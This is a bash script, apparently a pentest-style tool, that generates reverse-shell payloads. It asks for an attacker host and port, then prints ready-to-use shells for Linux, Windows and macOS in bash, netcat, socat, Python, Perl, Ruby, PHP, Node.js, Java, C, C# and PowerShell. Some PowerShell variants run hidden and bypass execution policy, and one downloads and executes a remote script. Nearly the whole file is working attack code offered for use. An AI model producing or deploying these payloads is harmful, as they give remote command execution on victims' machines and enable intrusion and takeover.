#!/bin/bash
#Coded By Machine404 Don't Copy this code without giving me credit!
NC='\033[0m'
RED='\033[1;38;5;196m'
GREEN='\033[1;38;5;040m'
ORANGE='\033[1;38;5;202m'
BLUE='\033[1;38;5;012m'
BLUE2='\033[1;38;5;032m'
PINK='\033[1;38;5;013m'
GRAY='\033[1;38;5;004m'
NEW='\033[1;38;5;154m'
YELLOW='\033[1;38;5;214m'
CG='\033[1;38;5;087m'
CP='\033[1;38;5;221m'
CPO='\033[1;38;5;205m'
CN='\033[1;38;5;247m'
CNC='\033[1;38;5;051m'
function banner(){
echo -e ${RED}"#############################################################################"
echo -e ${CP}"      _______         _   _____     _       ____  _          _ _   __        #"     
echo -e ${CP}"     / /  ___|_ _ ___| |_|___ / ___| |_    / ___|| |__   ___| | |__\ \       #" 
echo -e ${CP}"    | || |_ / _  / __| __| |_ \/ __| __|___\___ \| '_ \ / _ \ | / __| |      #" 
echo -e ${CP}"   < < |  _| (_| \__ \ |_ ___) \__ \ ||_____|__) | | | |  __/ | \__ \> >     #"  
echo -e ${CP}"    | ||_|  \__,_|___/\__|____/|___/\__|   |____/|_| |_|\___|_|_|___/ |      #"     
echo -e ${CP}"     \_\                                                           /_/       #"     
echo -e ${CNC}"          A FrameWork Of Generating All Types Of Reverse Shells Easily       #" 
echo -e ${BLUE}"                    https://facebook.com/unknownclay                         #"
echo -e ${PINK}"                    Coded By: Machine404                                     #"
echo -e ${CP}"                    https://github.com/machine1337                           #"
echo -e ${RED}"#############################################################################"

}

function linux(){
clear
banner
echo -e ${YELLOW}"\n[*] Choose Type Of Reverse Shell \n"

echo -e  "${NC}[${CG}"1"${NC}]${CNC} Bash-i Shell "
		echo -e  "${NC}[${CG}"2"${NC}]${CNC} Bash 196 Shell "
		echo -e  "${NC}[${CG}"3"${NC}]${CNC} Bash read line Shell"
		echo -e  "${NC}[${CG}"4"${NC}]${CNC} Socat#2 (TTY) Shell "
		echo -e  "${NC}[${CG}"5"${NC}]${CNC} Node.js Shell "
		echo -e  "${NC}[${CG}"6"${NC}]${CNC} Java  Shell"
		echo -e  "${NC}[${CG}"7"${NC}]${CNC} Telnet Shell"
		echo -e  "${NC}[${CG}"8"${NC}]${CNC} Bash 5 Shell"
		echo -e  "${NC}[${CG}"9"${NC}]${CNC} Bash UDP Shell"
		echo -e  "${NC}[${CG}"10"${NC}]${CNC} NC mkfifo Shell\n"
		echo -e  "${NC}[${CG}"11"${NC}]${CNC} NC -e Shell "
		echo -e  "${NC}[${CG}"12"${NC}]${CNC} NC -c Shell "
		echo -e  "${NC}[${CG}"13"${NC}]${CNC} Ncat -e Shell "
		echo -e  "${NC}[${CG}"14"${NC}]${CNC} Ncat UDP Shell "
		echo -e  "${NC}[${CG}"15"${NC}]${CNC} C Shell "
		echo -e "${NC}[${CG}"16"${NC}]${CNC} C# Shell "
		echo -e "${NC}[${CG}"17"${NC}]${CNC} Haskell#1 Shell "
		echo -e "${NC}[${CG}"18"${NC}]${CNC} Ruby Shell "
		echo -e "${NC}[${CG}"19"${NC}]${CNC} Python3 Shortest Shell "
		echo -e "${NC}[${CG}"20"${NC}]${CNC} Python3 Shell\n "
		echo -e "${NC}[${CG}"21"${NC}]${CNC} Python Shell "
		echo -e "${NC}[${CG}"22"${NC}]${CNC} Perl Shell"
		echo -e "${NC}[${CG}"23"${NC}]${CNC} PHP POPEN Shell"
		echo -e "${NC}[${CG}"24"${NC}]${CNC} PHP Shell_Exec Shell"
		echo -e "${NC}[${CG}"25"${NC}]${CNC} PHP System Shell"


echo -n -e  ${YELLOW}"\n[+] Select an Option:  " 
read REPLY
if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		req
		echo -e -n ${RED}"${CNC}\n[*] Your Bash-i Shell:> ${YELLOW}\nsh -i >& /dev/tcp/$lhost/$lport 0>&1 " | tee  $out
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
	        req
	        echo -e -n ${RED}"${CNC}\n[*] Your Bash 196 Shell:> \n${YELLOW}0<&196;exec 196<>/dev/tcp/$lhost/$lport; sh <&196 >&196 2>&196 " | tee  $out
		
	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
		req
		echo -e -n ${RED}"${CNC}\n[*] Your Bash-i Shell:> ${YELLOW}\nexec 5<>/dev/tcp/$lhost/$lport;cat <&5 | while read line; do $line 2>&5 >&5; done " | tee  $out
       	elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
       	           req
       	 echo -e -n ${RED}"${CNC}\n[*] Your Socat#2 (TTY) Shell:> ${YELLOW}\nsocat TCP:$lhost:$lport EXEC:'sh',pty,stderr,setsid,sigint,sane" | tee  $out
       	elif [[ "$REPLY" == 5 || "$REPLY" == 05 ]]; then
       	          req
       	echo -e -n ${RED}"${CNC}\n[*] Your Node.js Shell:> ${YELLOW}\nrequire('child_process').exec('nc -e sh $lhost $lport')" | tee  $out
       	elif [[ "$REPLY" == 6 || "$REPLY" == 06 ]]; then
       	           req
       	echo -e -n ${RED}"${CNC}\n[*] Your Java Shell:> \n${YELLOW}import java.io.BufferedReader;
import java.io.InputStreamReader;

public class shell {
    public static void main(String args[]) {
        String s;
        Process p;
        try {
            p = Runtime.getRuntime().exec(""bash -c $@|bash 0 echo bash -i >& /dev/tcp/$lhost/$lport 0>&1"");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}" | tee  $out
       	elif [[ "$REPLY" == 7 || "$REPLY" == 07 ]]; then
                   req   
        echo -e -n ${RED}"${CNC}\n[*] Your Telnet Shell:> ${YELLOW}\nTF=$(mktemp -u);mkfifo $TF && telnet $lhost $lport 0<$TF | sh 1>$TF " | tee  $out 
        elif [[ "$REPLY" == 8 || "$REPLY" == 08 ]]; then
                  req
        echo -e -n ${RED}"${CNC}\n[*] Your Bash 5 Shell:> ${YELLOW}\nsh -i 5<> /dev/tcp/$lhost/$lport 0<&5 1>&5 2>&5 " | tee  $out
        elif [[ "$REPLY" == 9 || "$REPLY" == 09 ]]; then
                   req
        echo -e -n ${RED}"${CNC}\n[*] Your Bash UDP Shell:> ${YELLOW}\nsh -i >& /dev/udp/$lhost/$lport 0>&1 " | tee  $out
        elif [[ "$REPLY" == 10 || "$REPLY" == 10 ]]; then
                  req
        echo -e -n ${RED}"${CNC}\n[*] Your nc mkfifo Shell:> ${YELLOW}\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $lhost $lport >/tmp/f" | tee  $out
        elif [[ "$REPLY" == 11 || "$REPLY" == 11 ]]; then
                   req
        echo -e -n ${RED}"${CNC}\n[*] Your nc -e Shell:> ${YELLOW}\nnc -e sh $lhost $lport" | tee  $out
        elif [[ "$REPLY" == 12 || "$REPLY" == 12 ]]; then
                 req
        echo -e -n ${RED}"${CNC}\n[*] Your nc -c Shell:> ${YELLOW}\nnc -c sh $lhost $lport" | tee  $out
        elif [[ "$REPLY" == 13 || "$REPLY" == 13 ]]; then
                  req
        echo -e -n ${RED}"${CNC}\n[*] Your ncat -e Shell:> ${YELLOW}\nncat $lhost $lport -e sh" | tee  $out
        elif [[ "$REPLY" == 14 || "$REPLY" == 14 ]]; then
                  req
        echo -e -n ${RED}"${CNC}\n[*] Your ncat UDP Shell:> ${YELLOW}\nncat $lhost $lport -e sh" | tee  $out
        elif [[ "$REPLY" == 15 || "$REPLY" == 15 ]]; then
                   req
        echo -e -n ${RED}"${CNC}\n[*] Your C Shell:> ${YELLOW}\n#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = $lport;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("$lhost");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"sh", NULL};
    execve("sh", argv, NULL);

    return 0;       
}" | tee  $out
        elif [[ "$REPLY" == 16 || "$REPLY" == 16 ]]; then
                   req
        echo -e -n ${RED}"${CNC}\n[*] Your C# Shell:> ${YELLOW}\nusing System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient("$lhost", $lport))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);
						
						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}" | tee  $out
        elif [[ "$REPLY" == 17 || "$REPLY" == 17 ]]; then
                    req
        echo -e -n ${RED}"${CNC}\n[*] Your Haskell#1 Shell:> ${YELLOW}\nmodule Main where

import System.Process

main = callCommand ""rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | sh -i 2>&1 | nc $lhost $lport >/tmp/f""" | tee  $out
        
        elif [[ "$REPLY" == 18 || "$REPLY" == 18 ]]; then
                    req
        echo -e -n ${RED}"${CNC}\n[*] Your Ruby Shell:> ${YELLOW}\nruby -rsocket -e'f=TCPSocket.open("$lhost",$lport).to_i;exec sprintf(""sh -i <&%d >&%d 2>&%d"",f,f,f)'" | tee  $out
        elif [[ "$REPLY" == 19 || "$REPLY" == 19 ]]; then
                   req
        echo -e -n ${RED}"${CNC}\n[*] Your Python3 Shortest Shell :> ${YELLOW}\npython3 -c 'import os,pty,socket;s=socket.socket();s.connect(("$lhost",$lport));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'" | tee  $out
        elif [[ "$REPLY" == 20 || "$REPLY" == 20 ]]; then
                    req
        echo -e -n ${RED}"${CNC}\n[*] Your  Python3 Shell:> ${YELLOW}\npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lhost",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'" | tee  $out
        elif [[ "$REPLY" == 21 || "$REPLY" == 21 ]]; then
                    req
        echo -e -n ${RED}"${CNC}\n[*] Your Python Shell:> ${YELLOW}\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lhost",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'" | tee  $out
        elif [[ "$REPLY" == 22 || "$REPLY" == 22 ]]; then
                    req
       echo -e -n ${RED}"${CNC}\n[*] Your Perl Shell:> ${YELLOW}\nperl -e 'use Socket;$i="$lhost";$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"'>&S'");open(STDERR,"'>&S'");exec("sh -i");};'" | tee  $out
  
  elif [[ "$REPLY" == 23 || "$REPLY" == 23 ]]; then
   req
  echo -e -n ${RED}"${CNC}\n[*] Your PHP POPEN Shell:> ${YELLOW}\nphp -r '$sock=fsockopen("$lhost",$lport);popen(""sh <&3 >&3 2>&3"", "r");'" | tee  $out
  elif [[ "$REPLY" == 24 || "$REPLY" == 24 ]]; then
  req
  echo -e -n ${RED}"${CNC}\n[*] Your PHP Shell_exec Shell:> ${YELLOW}\nphp -r '$sock=fsockopen("$lhost",$lport);shell_exec(""sh <&3 >&3 2>&3"");'"
  
  elif [[ "$REPLY" == 25 || "$REPLY" == 25 ]]; then   
  req
   echo -e -n ${RED}"${CNC}\n[*] Your PHP SYSTEM Shell:> ${YELLOW}\nphp -r '$sock=fsockopen("$lhost",$lport);system(""sh <&3 >&3 2>&3"");'" | tee $out 
fi
}
function windows(){
clear
banner
echo -e ${YELLOW}"\n[*] Choose Type Of Reverse Shell \n"


		echo -e "${NC}[${CG}"1"${NC}]${CNC} Powershell#1 shell"
		echo -e "${NC}[${CG}"2"${NC}]${CNC} Powershell#2 shell"
		echo -e "${NC}[${CG}"3"${NC}]${CNC} Powershell#3 (TLS) Shell"
		echo -e "${NC}[${CG}"4"${NC}]${CNC} Windows ConPty Shell"
		echo -e "${NC}[${CG}"5"${NC}]${CNC} NC.exe -e Shell "
		echo -e "${NC}[${CG}"6"${NC}]${CNC} Ncat.exe -e Shell "
                echo -e "${NC}[${CG}"7"${NC}]${CNC} Wants More Windows Shells "

echo -n -e  ${YELLOW}"\n[+] Select an Option:  " 
read REPLY
if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
req
echo -e -n ${RED}"\n[*] Your Powershell#1 Shell: ${CNC}\npowershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("$lhost",$lport);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + ""> "";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" | tee  $out
elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
req
echo -e -n ${RED}"\n[*] Your Powershell#2 Shell: ${CNC}\npowershell -nop -c ""$client = New-Object System.Net.Sockets.TCPClient('$lhost',$lport);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()""" | tee  $out
elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
req
echo -e -n ${RED}"\n[*] Your Powershell#3 (TLS) Shell: ${CNC}\npowershell -nop -W hidden -noni -ep bypass -c ""$TCPClient = New-Object Net.Sockets.TCPClient('$lhost', $lport);$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()""" | tee  $out
elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
req
echo -e -n ${RED}"\n[*] Your Windows ConPty Shell: ${CNC}\nIEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell $lhost $lport" | tee  $out
elif [[ "$REPLY" == 5 || "$REPLY" == 05 ]]; then
req
echo -e -n ${RED}"\n[*] Your nc.exe -e Shell: nc -e sh $lhost $lport " | tee  $out
elif [[ "$REPLY" == 6 || "$REPLY" == 06 ]]; then
req
echo -e -n ${RED}"\n[*] Your ncat.exe -e Shell: ${CNC}\nncat.exe $lhost $lport -e sh" | tee  $out
elif [[ "$REPLY" == 7 || "$REPLY" == 07 ]]; then
clear
banner
echo -e -n ${BLUE}"\n[+] Some PHP based Shells are also Use for Windows Shell: "
sleep 2
linux
fi
}
function req(){
echo -e -n ${BLUE}"\n[ + ] Enter LHOST:   "
read lhost
echo -e -n ${CP}"\n[ + ] Enter LPORT:  "
read lport
}
function mac(){
clear
banner
echo -e -n ${RED}"\n You Can also Use Windows & Linux Shells For MAC OS\n"
sleep 1
echo -e -n ${CP}"\n Moving to Linux Shells :) "
sleep 2
linux
}


menu()
{
clear
banner
echo -e ${YELLOW}"\n[*] Generate Reverse Shells Easily: \n"
echo -e "${NC}[${CG}"1"${NC}]${CNC} Linux Shells"
echo -e "${NC}[${CG}"2"${NC}]${CNC} Windows Shells"
echo -e "${NC}[${CG}"3"${NC}]${CNC} Mac OS Shells"
echo -e "${NC}[${CG}"4"${NC}]${CNC} EXIT"

echo -n -e ${YELLOW}"\n[+] Select: "
        read choose
                if [ $choose -eq 1 ]; then
                        linux
                elif [ $choose -eq 2 ]; then
                      windows
                elif [ $choose -eq 3 ]; then
                      mac
                elif [ $choose -eq 4 ]; then
                       exit
                fi
}
menu
#Coded By Machine404, Don't Copy this code Without Giving me Credit nerd!
